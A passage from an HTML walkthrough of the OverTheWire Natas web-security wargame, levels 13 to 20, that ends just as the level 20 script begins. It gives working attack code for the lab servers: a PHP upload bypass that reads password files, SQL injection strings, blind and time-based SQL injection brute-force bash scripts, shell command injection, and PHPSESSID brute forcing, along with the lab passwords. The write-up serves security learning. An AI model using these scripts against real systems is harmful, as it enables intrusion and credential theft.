<span class="go">jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</span>
</pre></div>
</div>
</div>
<div class="section" id="id14">
<h2>3.27.13. <a class="reference external" href="http://natas13.natas.labs.overthewire.org/">Natas Level 13 -&gt; 14</a><a class="headerlink" href="#id14" title="Permalink to this headline">¶</a></h2>
<p>Level 13 Password = “jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY”</p>
<p>Basically a repeat of Level 12 except that the server-side script uses an <code class="docutils literal"><span class="pre">exif_imagetype</span></code> check to make sure the uploaded file is an image file. We circumvent that test by prepending the first 12 bytes of a jpeg downloaded from the web to an exploit php script, then proceed as in Level 12, except the url and username/password change to reflect Level 13. Here is the run:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$ #</span> We start with modified versions of Level <span class="m">12</span>
<span class="gp">me@myhost:~/Natas$ #</span>   exploit.php outputs /etc/natas_webpass/natas14
<span class="gp">me@myhost:~/Natas$ #</span>   natas14.sh uploads exploit.php, gets the results
<span class="gp">me@myhost:~/Natas$</span> ls
<span class="go">exploit.php  natas14.sh</span>
<span class="gp">me@myhost:~/Natas$</span> cat exploit.php

<span class="go">&lt;?</span>

<span class="gp">$</span><span class="nv">myFile</span> <span class="o">=</span> <span class="s2">&quot;/etc/natas_webpass/natas14&quot;</span><span class="p">;</span>
<span class="gp">$</span><span class="nv">fh</span> <span class="o">=</span> fopen<span class="o">(</span><span class="nv">$myFile</span>, <span class="s1">&#39;r&#39;</span><span class="o">)</span><span class="p">;</span>
<span class="gp">$</span><span class="nv">theData</span> <span class="o">=</span> fread<span class="o">(</span><span class="nv">$fh</span>, <span class="m">32</span><span class="o">)</span><span class="p">;</span>
<span class="go">fclose($fh);</span>
<span class="go">echo $theData;</span>

<span class="go">?&gt;</span>
<span class="gp">me@myhost:~/Natas$</span>
<span class="gp">me@myhost:~/Natas$</span>
<span class="gp">me@myhost:~/Natas$</span>
<span class="gp">me@myhost:~/Natas$</span> cat natas14.sh
<span class="gp">#</span>!/usr/bin/env bash

<span class="go">upload=$( \</span>
<span class="go">  curl --silent \</span>
<span class="go">       --form action=index.php \</span>
<span class="go">       --form MAX_FILE_SIZE=1000 \</span>
<span class="go">       --form filename=natas14.php \</span>
<span class="go">       --form submit=&quot;Upload File&quot; \</span>
<span class="go">       --form uploadedfile=@natas14.php \</span>
<span class="go">       --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \</span>
<span class="go">       http://natas13.natas.labs.overthewire.org/ \</span>
<span class="go">  | grep &#39;a href=&quot;upload/&#39; \</span>
<span class="go">)</span>
<span class="go">file=${upload#*upload/}</span>
<span class="go">file=${file%%\&quot;*}</span>
<span class="go">curl --silent \</span>
<span class="go">     --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \</span>
<span class="go">     http://natas13.natas.labs.overthewire.org/upload/$file |</span>
<span class="go">tail -n1</span>
<span class="gp">me@myhost:~/Natas$</span>
<span class="gp">me@myhost:~/Natas$</span>
<span class="gp">me@myhost:~/Natas$</span>
<span class="gp">me@myhost:~/Natas$ #</span> Get first <span class="m">12</span> bytes of random jpeg from web
<span class="gp">me@myhost:~/Natas$</span> curl --silent --output -  http://www.exiv2.org/include/img_1771.jpg <span class="p">|</span> head -c <span class="m">12</span> &gt; natas14.php
<span class="gp">me@myhost:~/Natas$ #</span> Add in the exploit.php <span class="o">=</span> jpeg and php file
<span class="gp">me@myhost:~/Natas$</span> cat exploit.php &gt;&gt; natas14.php
<span class="gp">me@myhost:~/Natas$ #</span> Run the exploit like in Level <span class="m">12</span>
<span class="gp">me@myhost:~/Natas$</span> ./natas14.sh
<span class="go">Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</span>
</pre></div>
</div>
</div>
<div class="section" id="id15">
<h2>3.27.14. <a class="reference external" href="http://natas14.natas.labs.overthewire.org/">Natas Level 14 -&gt; 15</a><a class="headerlink" href="#id15" title="Permalink to this headline">¶</a></h2>
<p>Level 14 Password = “Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1”</p>
<blockquote>
<div>The web page has a “view sourcecode” link which shows a php script allowing a sql injection attack. Setting both the username and password fields to <em>‘natas14” or 1 or “a’</em> yields the natas15 password of “AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J”.</div></blockquote>
</div>
<div class="section" id="id16">
<h2>3.27.15. <a class="reference external" href="http://natas15.natas.labs.overthewire.org/">Natas Level 15 -&gt; 16</a><a class="headerlink" href="#id16" title="Permalink to this headline">¶</a></h2>
<p>Level 15 Password = “AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J”</p>
<blockquote>
<div>The web page has a “view sourcecode” link which shows another sql injection opportunity. Unfortunately the page doesn’t display the results of the query, just whether or not more than 1 row was returned from the query. That can be exploited (with a certain amount of persistence) to get the password. For instance, you can start out entering <em>natas16” and LENGTH(password) = 32 and username=”natas16</em> to see that the password has length 32 (like the other passwords). Since the other passwords were base64, you can create a script using mysql’s <code class="docutils literal"><span class="pre">SUBSTRING</span></code> to brute force each password character in the base64 range. Here is a brute force bash script. (Note - we added BINARY to the query to get the comparisons to be case-sensitive. And <code class="docutils literal"><span class="pre">grep</span></code> is run using the default regular expressions so that + does not have special meaning.)</div></blockquote>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="k">function</span> try_guess<span class="o">()</span>
<span class="o">{</span>
  <span class="nb">local</span> <span class="nv">__resultvar</span><span class="o">=</span><span class="nv">$1</span>
  <span class="nb">local</span> <span class="nv">query</span><span class="o">=</span><span class="s2">&quot;natas16\&quot; and BINARY SUBSTRING(password,</span><span class="nv">$2</span><span class="s2">,1) = \&quot;</span><span class="nv">$3</span><span class="s2">&quot;</span>
  <span class="nb">local</span> <span class="nv">hit</span><span class="o">=</span>no
  <span class="nb">local</span> <span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
  curl --silent <span class="se">\</span>
       --form <span class="nv">action</span><span class="o">=</span>index.php <span class="se">\</span>
       --form <span class="nv">username</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$query</span><span class="s2">&quot;</span> <span class="se">\</span>
       --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Check existence&quot;</span> <span class="se">\</span>
       --user natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J <span class="se">\</span>
       http://natas15.natas.labs.overthewire.org/?debug<span class="o">=</span><span class="nb">true</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="k">)</span>
  <span class="k">if</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$curlout</span><span class="s2">&quot;</span> <span class="o">=</span>~ <span class="s2">&quot;This user exists&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nv">hit</span><span class="o">=</span>yes
  <span class="k">elif</span> <span class="o">[[</span> ! <span class="s2">&quot;</span><span class="nv">$curlout</span><span class="s2">&quot;</span> <span class="o">=</span>~ <span class="s2">&quot;This user doesn&#39;t exist&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nb">echo</span> <span class="s2">&quot;ERROR - no input received for guess </span><span class="nv">$2</span><span class="s2">&quot;</span>
    <span class="nb">exit</span> <span class="m">1</span>
  <span class="k">fi</span>
  <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$curlout</span><span class="s2">&quot;</span> <span class="o">=</span>~ <span class="s2">&quot;This user exists&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">hit</span><span class="o">=</span><span class="s2">&quot;yes&quot;</span>
  <span class="nb">eval</span> <span class="nv">$__resultvar</span><span class="o">=</span><span class="s2">&quot;&#39;</span><span class="nv">$hit</span><span class="s2">&#39;&quot;</span>
<span class="o">}</span>

<span class="nv">b64</span><span class="o">=</span><span class="s2">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/&quot;</span>
<span class="nv">ntries</span><span class="o">=</span><span class="si">${#</span><span class="nv">b64</span><span class="si">}</span>
<span class="nv">guess</span><span class="o">=</span>
<span class="nv">known</span><span class="o">=</span>

<span class="k">for</span> <span class="o">((</span> <span class="nv">i</span><span class="o">=</span><span class="m">1</span><span class="p">;</span> i &lt; <span class="m">33</span><span class="p">;</span> i++ <span class="o">))</span><span class="p">;</span> <span class="k">do</span>
  <span class="nb">echo</span> <span class="s2">&quot;testing </span><span class="nv">$i</span><span class="s2">&quot;</span>
  <span class="k">for</span> <span class="o">((</span> <span class="nv">j</span><span class="o">=</span><span class="m">0</span><span class="p">;</span> j &lt; ntries<span class="p">;</span> j++ <span class="o">))</span><span class="p">;</span> <span class="k">do</span>
    <span class="nv">guess</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">b64</span><span class="p">:</span><span class="nv">j</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="s2">&quot;</span>
    try_guess result <span class="nv">$i</span> <span class="s2">&quot;</span><span class="nv">$guess</span><span class="s2">&quot;</span>
    <span class="k">if</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$result</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;yes&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
      <span class="nv">known</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$known$guess</span><span class="s2">&quot;</span>
      <span class="nb">break</span>
    <span class="k">fi</span>
  <span class="k">done</span>
  <span class="k">if</span> <span class="o">[[</span> <span class="si">${#</span><span class="nv">known</span><span class="si">}</span> -ne <span class="nv">$i</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nb">echo</span> <span class="s2">&quot;ERROR - password character </span><span class="nv">$i</span><span class="s2"> failed&quot;</span>
    <span class="nb">exit</span> <span class="m">1</span>
  <span class="k">fi</span>
<span class="k">done</span>
<span class="nb">echo</span> <span class="s2">&quot;SUCCESS - password is </span><span class="nv">$known</span><span class="s2">&quot;</span>
</pre></div>
</div>
</div>
<div class="section" id="id17">
<h2>3.27.16. <a class="reference external" href="http://natas16.natas.labs.overthewire.org/">Natas Level 16 -&gt; 17</a><a class="headerlink" href="#id17" title="Permalink to this headline">¶</a></h2>
<p>Level 16 Password = “WaIHEacj63wnNIBROHeqi3p9t0m5nhmh”</p>
<p>The web page has a “view sourcecode” link which shows shell injection into the command <code class="docutils literal"><span class="pre">passthru(&quot;grep</span> <span class="pre">-i</span> <span class="pre">\&quot;$key\&quot;</span> <span class="pre">dictionary.txt&quot;)</span></code>. By suitably selecting the input for <code class="docutils literal"><span class="pre">$key</span></code> we can brute force the password character-by-character.</p>
<p>One approach (with much more complex coding but faster runtime) involved using <code class="docutils literal"><span class="pre">$(cut</span> <span class="pre">-bN</span> <span class="pre">/etc/natas_webpass/natas17)</span></code> as the input string, extracting out the N’th password character and for search against the dictionary. It has the advantage of needing less Natas web site hits: for each password that’s a letter, 1 http PUT will narrow it down to the letter (upper or lower case because of the case-insensitive <code class="docutils literal"><span class="pre">grep</span> <span class="pre">-i</span></code>) and another http PUT can determine the upper vs lower case. So character-by-character the character is cut out, if it has matches it’s a letter and search the output to determine what letter (but you don’t know if upper or lower case). The case can be determined by translating the lower/upper case character to ‘a’ and ‘b’, respectively and doing the search again. (For ‘m’ vs. ‘M’, translate them to ‘a’, ‘b’ respectively via <code class="docutils literal"><span class="pre">$(expr</span> <span class="pre">substr</span> <span class="pre">ab</span> <span class="pre">$(expr</span> <span class="pre">index</span> <span class="pre">mM</span> <span class="pre">$(cut</span> <span class="pre">-b1</span> <span class="pre">/etc/natas_webpass/natas17))</span> <span class="pre">1)</span></code>. Similarly you can translate 0-9, +, and / to a-m, respectively via <code class="docutils literal"><span class="pre">$(expr</span> <span class="pre">substr</span> <span class="pre">abcdefhijklm</span> <span class="pre">$(expr</span> <span class="pre">index</span> <span class="pre">0123456789+/</span> <span class="pre">\\$(cut</span> <span class="pre">-b1</span> <span class="pre">/etc/natas_webpass/natas17))</span> <span class="pre">1)</span></code>.) But the approach has one big flaw: it isn’t easy to automate. If you needed to do this with a minimum of website hits and don’t mind some manual steps it’s great.</p>
<p>But we want an approach that is easy to automate. That is, it generates no dictionary match output when we guess a password character correctly (avoiding the problem of determining lower vs. upper case hits, not to mention 0-9, +, and /). And generates a dictionary match output when we’re wrong. Take the first string in <em>dictionary.txt</em> “African” and note that adding a character in front of it will get 0 search results but the bare term itself will generate 2. If we know the password starts with ABCD and want to guess E, input string <code class="docutils literal"><span class="pre">$(grep</span> <span class="pre">'^ABCDE.*'</span> <span class="pre">/etc/natas_webpass/natas17)African</span></code> will result in either empty search results if we’re right, or search hits if we’re not. So we can do another brute force over the 32 password characters guessing from the base64 character set. Here is a bash script to do just that. (Note - <code class="docutils literal"><span class="pre">grep</span></code> is run using the default regular expressions so that + does not have special meaning.)</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="k">function</span> try_guess<span class="o">()</span>
<span class="o">{</span>
  <span class="nb">local</span> <span class="nv">__resultvar</span><span class="o">=</span><span class="nv">$1</span>
  <span class="nb">local</span> <span class="nv">word</span><span class="o">=</span><span class="s2">&quot;African&quot;</span>
  <span class="nb">local</span> hit
  <span class="nb">local</span> <span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span>curl --silent <span class="se">\</span>
       --form <span class="nv">needle</span><span class="o">=</span><span class="s2">&quot;\$(grep ^</span><span class="nv">$2</span><span class="s2">.* /etc/natas_webpass/natas17)</span><span class="nv">$word</span><span class="s2">&quot;</span> <span class="se">\</span>
       --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Search&quot;</span> <span class="se">\</span>
       --user natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh <span class="se">\</span>
       http://natas16.natas.labs.overthewire.org/ <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="k">)</span>
  <span class="nv">hit</span><span class="o">=</span>yes
  <span class="k">if</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$curlout</span><span class="s2">&quot;</span> <span class="o">=</span>~ <span class="s2">&quot;</span><span class="nv">$word</span><span class="s2">&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nv">hit</span><span class="o">=</span>no
  <span class="k">elif</span> <span class="o">[[</span> ! <span class="s2">&quot;</span><span class="nv">$curlout</span><span class="s2">&quot;</span> <span class="o">=</span>~ <span class="s2">&quot;Output:&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nb">echo</span> <span class="s2">&quot;ERROR - no input received for guess </span><span class="nv">$2</span><span class="s2">&quot;</span>
    <span class="nb">exit</span> <span class="m">1</span>
  <span class="k">fi</span>
  <span class="nb">eval</span> <span class="nv">$__resultvar</span><span class="o">=</span><span class="s2">&quot;&#39;</span><span class="nv">$hit</span><span class="s2">&#39;&quot;</span>
<span class="o">}</span>

<span class="c1"># Use grep with default regular expressions so + is not special</span>
<span class="nv">b64</span><span class="o">=</span><span class="s2">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/&quot;</span>
<span class="nv">ntries</span><span class="o">=</span><span class="si">${#</span><span class="nv">b64</span><span class="si">}</span>
<span class="nv">guess</span><span class="o">=</span>
<span class="nv">known</span><span class="o">=</span>
<span class="nv">nknown</span><span class="o">=</span><span class="m">0</span>

<span class="k">for</span> <span class="o">((</span> <span class="nv">i</span><span class="o">=</span>nknown+1<span class="p">;</span> i &lt; <span class="m">33</span><span class="p">;</span> i++ <span class="o">))</span><span class="p">;</span> <span class="k">do</span>
  <span class="nb">echo</span> <span class="s2">&quot;testing </span><span class="nv">$i</span><span class="s2">&quot;</span>
  <span class="k">for</span> <span class="o">((</span> <span class="nv">j</span><span class="o">=</span><span class="m">0</span><span class="p">;</span> j &lt; ntries<span class="p">;</span> j++ <span class="o">))</span><span class="p">;</span> <span class="k">do</span>
    <span class="nv">guess</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">known</span><span class="si">}${</span><span class="nv">b64</span><span class="p">:</span><span class="nv">j</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="s2">&quot;</span>
    sleep <span class="m">2</span>
    <span class="nb">echo</span> <span class="nv">guess</span><span class="o">=</span><span class="nv">$guess</span>
    <span class="nv">result</span><span class="o">=</span>no
    try_guess result <span class="s2">&quot;</span><span class="nv">$guess</span><span class="s2">&quot;</span>
    <span class="nb">echo</span> <span class="nv">result</span> <span class="o">=</span> <span class="nv">$result</span>
    <span class="k">if</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$result</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;yes&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
      <span class="nv">known</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$guess</span><span class="s2">&quot;</span>
      <span class="nb">echo</span> hit so <span class="nv">known</span><span class="o">=</span><span class="nv">$known</span>
      <span class="nb">break</span>
    <span class="k">fi</span>
  <span class="k">done</span>
  <span class="k">if</span> <span class="o">[[</span> <span class="si">${#</span><span class="nv">known</span><span class="si">}</span> -ne <span class="nv">$i</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nb">echo</span> <span class="s2">&quot;ERROR - password character </span><span class="nv">$i</span><span class="s2"> failed&quot;</span>
    <span class="nb">exit</span> <span class="m">1</span>
  <span class="k">fi</span>
<span class="k">done</span>
<span class="nb">echo</span> <span class="s2">&quot;SUCCESS - password is </span><span class="nv">$known</span><span class="s2">&quot;</span>
</pre></div>
</div>
</div>
<div class="section" id="id18">
<h2>3.27.17. <a class="reference external" href="http://natas17.natas.labs.overthewire.org/">Natas Level 17 -&gt; 18</a><a class="headerlink" href="#id18" title="Permalink to this headline">¶</a></h2>
<p>Level 17 Password = “8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw”</p>
<p>The web page has a “view sourcecode” link which shows the normal page execution produces no query result output. We could use the approach of Level 15 -&gt; 16 to guess the password character-by-character, but there’s no physical output to determine if our password guesses are correct. However, there is a well-known trick called a time-based sql injection. Basically, you construct a query that if it succeeds it takes a long time to return, but failure returns quickly. So we can use the answer to Level 15 -&gt; 16 modified to have a long delay if our password character guess is correct, but fail right away if the guess is wrong. All we need to do is check for the query taking a long time vs. checking for “This user exists”.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="k">function</span> try_guess<span class="o">()</span>
<span class="o">{</span>
  <span class="nb">local</span> <span class="nv">__resultvar</span><span class="o">=</span><span class="nv">$1</span>
  <span class="nb">local</span> <span class="nv">query</span><span class="o">=</span><span class="s2">&quot;natas18\&quot; and IF (BINARY SUBSTRING(password,</span><span class="nv">$2</span><span class="s2">,1)&quot;</span>
  <span class="nv">query</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$query</span><span class="s2"> = \&quot;</span><span class="nv">$3</span><span class="s2">\&quot;, SLEEP(15), 0) and \&quot;1&quot;</span>
  <span class="nb">local</span> <span class="nv">hit</span><span class="o">=</span>no
  <span class="nb">local</span> curlout
  <span class="nv">TIME1</span><span class="o">=</span><span class="k">$(</span>date +%s<span class="k">)</span>
  <span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
  curl --silent <span class="se">\</span>
       --form <span class="nv">action</span><span class="o">=</span>index.php <span class="se">\</span>
       --form <span class="nv">username</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$query</span><span class="s2">&quot;</span> <span class="se">\</span>
       --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Check existence&quot;</span> <span class="se">\</span>
       --user natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw <span class="se">\</span>
       http://natas17.natas.labs.overthewire.org/?debug<span class="o">=</span><span class="nb">true</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="k">)</span>
  <span class="nv">TIME2</span><span class="o">=</span><span class="k">$(</span>date +%s<span class="k">)</span>
  <span class="k">if</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$curlout</span><span class="s2">&quot;</span> <span class="o">=</span>~ <span class="s2">&quot;Executing query&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    <span class="o">[[</span> <span class="k">$((</span> TIME2 <span class="o">-</span> TIME1 <span class="k">))</span> -gt <span class="m">10</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">hit</span><span class="o">=</span>yes
  <span class="k">else</span>
    <span class="nb">echo</span> <span class="s2">&quot;ERROR - no input received for guess </span><span class="nv">$2</span><span class="s2">&quot;</span>
    <span class="nb">exit</span> <span class="m">1</span>
  <span class="k">fi</span>
  <span class="nb">eval</span> <span class="nv">$__resultvar</span><span class="o">=</span><span class="s2">&quot;&#39;</span><span class="nv">$hit</span><span class="s2">&#39;&quot;</span>
<span class="o">}</span>

<span class="nv">b64</span><span class="o">=</span><span class="s2">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/&quot;</span>
<span class="nv">ntries</span><span class="o">=</span><span class="si">${#</span><span class="nv">b64</span><span class="si">}</span>
<span class="nv">guess</span><span class="o">=</span>
<span class="nv">known</span><span class="o">=</span>

<span class="k">for</span> <span class="o">((</span> <span class="nv">i</span><span class="o">=</span><span class="m">1</span><span class="p">;</span> i &lt; <span class="m">33</span><span class="p">;</span> i++ <span class="o">))</span><span class="p">;</span> <span class="k">do</span>
  <span class="nb">echo</span> <span class="s2">&quot;guessing </span><span class="nv">$i</span><span class="s2">&quot;</span>
  <span class="k">for</span> <span class="o">((</span> <span class="nv">j</span><span class="o">=</span><span class="m">0</span><span class="p">;</span> j &lt; ntries<span class="p">;</span> j++ <span class="o">))</span><span class="p">;</span> <span class="k">do</span>
    <span class="nv">guess</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">b64</span><span class="p">:</span><span class="nv">j</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="s2">&quot;</span>
    try_guess result <span class="nv">$i</span> <span class="s2">&quot;</span><span class="nv">$guess</span><span class="s2">&quot;</span>
    <span class="k">if</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$result</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;yes&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
      <span class="nv">known</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$known$guess</span><span class="s2">&quot;</span>
      <span class="nb">echo</span> known so <span class="nv">far</span> <span class="o">=</span> <span class="nv">$known</span>
      <span class="nb">break</span>
    <span class="k">fi</span>
  <span class="k">done</span>
  <span class="k">if</span> <span class="o">[[</span> <span class="si">${#</span><span class="nv">known</span><span class="si">}</span> -ne <span class="nv">$i</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nb">echo</span> <span class="s2">&quot;ERROR - known so far = </span><span class="nv">$known</span><span class="s2">&quot;</span>
    <span class="nb">echo</span> <span class="s2">&quot;ERROR - password character </span><span class="nv">$i</span><span class="s2"> failed&quot;</span>
    <span class="nb">exit</span> <span class="m">1</span>
  <span class="k">fi</span>
<span class="k">done</span>
<span class="nb">echo</span> <span class="s2">&quot;SUCCESS - password is </span><span class="nv">$known</span><span class="s2">&quot;</span>
</pre></div>
</div>
</div>
<div class="section" id="id19">
<h2>3.27.18. <a class="reference external" href="http://natas18.natas.labs.overthewire.org/">Natas Level 18 -&gt; 19</a><a class="headerlink" href="#id19" title="Permalink to this headline">¶</a></h2>
<p>Level 18 Password = “xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP”</p>
<p>The web page has a “view sourcecode” link which code analysis shows stores a PHPSESSID cookie. The following script guesses all possibly values of the session id to find one that has admin credentials.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="k">for</span> <span class="o">((</span> <span class="nv">i</span><span class="o">=</span><span class="m">1</span><span class="p">;</span> i &lt;<span class="o">=</span> <span class="m">640</span><span class="p">;</span> i++ <span class="o">))</span><span class="p">;</span> <span class="k">do</span>
  <span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
    curl --silent <span class="se">\</span>
         --cookie <span class="s2">&quot;PHPSESSID=</span><span class="nv">$i</span><span class="s2">&quot;</span> <span class="se">\</span>
         --user natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP <span class="se">\</span>
         http://natas18.natas.labs.overthewire.org/?debug<span class="o">=</span><span class="nb">true</span> <span class="se">\</span>
    <span class="k">)</span>
  <span class="k">if</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$curlout</span><span class="s2">&quot;</span> <span class="o">=</span>~ <span class="s2">&quot;The credentials for the next level&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">curlout</span><span class="p">#*Password: </span><span class="si">}</span>
    <span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">password</span><span class="p">%%&lt;/pre&gt;*</span><span class="si">}</span>
    <span class="nb">echo</span> <span class="s2">&quot;PHPSESSID=</span><span class="nv">$i</span><span class="s2"> yields password </span><span class="nv">$password</span><span class="s2">&quot;</span>
    <span class="nb">break</span>
  <span class="k">fi</span>
<span class="k">done</span>
</pre></div>
</div>
<p>Running the script yields the password:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> ./natas18.sh
<span class="go">PHPSESSID=585 yields password 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</span>
</pre></div>
</div>
</div>
<div class="section" id="id20">
<h2>3.27.19. <a class="reference external" href="http://natas19.natas.labs.overthewire.org/">Natas Level 19 -&gt; 20</a><a class="headerlink" href="#id20" title="Permalink to this headline">¶</a></h2>
<p>Level 19 Password = “4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs”</p>
<p>Same as the prior level except session IDs are no longer sequential. Entering a user of “whoami” yields a cookie PHPSESSID = “3339302d77686f616d69”, which is ascii “390-whoami”. So we guess the admin session id’s are NNN-admin and try those.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="k">for</span> <span class="o">((</span> <span class="nv">i</span><span class="o">=</span><span class="m">1</span><span class="p">;</span> i &lt;<span class="o">=</span> <span class="m">640</span><span class="p">;</span> i++ <span class="o">))</span><span class="p">;</span> <span class="k">do</span>
<span class="c1"># for (( i=580; i &lt;= 590; i++ )); do</span>
  <span class="nv">sid</span><span class="o">=</span><span class="k">$(</span>xxd -pu <span class="o">&lt;&lt;&lt;</span> <span class="s2">&quot;</span><span class="si">${</span><span class="nv">i</span><span class="si">}</span><span class="s2">-admin&quot;</span><span class="k">)</span>
  <span class="nv">sid</span><span class="o">=</span><span class="si">${</span><span class="nv">sid</span><span class="p">%??</span><span class="si">}</span>
  <span class="nb">echo</span> <span class="s2">&quot;Trying PHPSESSID=</span><span class="nv">$sid</span><span class="s2">&quot;</span>
  <span class="nv">curlout</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
    curl --silent <span class="se">\</span>
         --cookie <span class="s2">&quot;PHPSESSID=</span><span class="nv">$sid</span><span class="s2">&quot;</span> <span class="se">\</span>
         --user natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs <span class="se">\</span>
         http://natas19.natas.labs.overthewire.org/?debug<span class="o">=</span><span class="nb">true</span> <span class="se">\</span>
    <span class="k">)</span>
  <span class="c1"># echo &quot;curlout=$curlout&quot;</span>
  <span class="k">if</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$curlout</span><span class="s2">&quot;</span> <span class="o">=</span>~ <span class="s2">&quot;The credentials for the next level&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">curlout</span><span class="p">#*Password: </span><span class="si">}</span>
    <span class="nv">password</span><span class="o">=</span><span class="si">${</span><span class="nv">password</span><span class="p">%%&lt;/pre&gt;*</span><span class="si">}</span>
    <span class="nb">echo</span> <span class="s2">&quot;PHPSESSID=</span><span class="si">${</span><span class="nv">i</span><span class="si">}</span><span class="s2">-admin yields password </span><span class="nv">$password</span><span class="s2">&quot;</span>
    <span class="nb">break</span>
  <span class="k">fi</span>
<span class="k">done</span>
</pre></div>
</div>
<p>Running the script yields the password:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> ./natas19.sh
<span class="go">PHPSESSID=501-admin yields password eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</span>
</pre></div>
</div>
</div>
<div class="section" id="id21">
<h2>3.27.20. <a class="reference external" href="http://natas20.natas.labs.overthewire.org/">Natas Level 20 -&gt; 21</a><a class="headerlink" href="#id21" title="Permalink to this headline">¶</a></h2>
<p>Level 20 Password = “eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF”</p>
<p>The web page has a “view sourcecode” link which code analysis shows they use a custom method to store/retrieve session data. The key/value pairs are stored separated by “\n”. So 2 runs of <code class="docutils literal"><span class="pre">curl</span></code> will suffice to crack the password: (1) the first run gets a PHPSESSID and sets the name field to “admin\nadmin 1” (with a real “\n”, not the literal text); (2) the second run will use the established PHPSESSID with the name field set to have the embedded newline create a session variable “admin” with value “1”. Here is a script that automates the attack:</p>
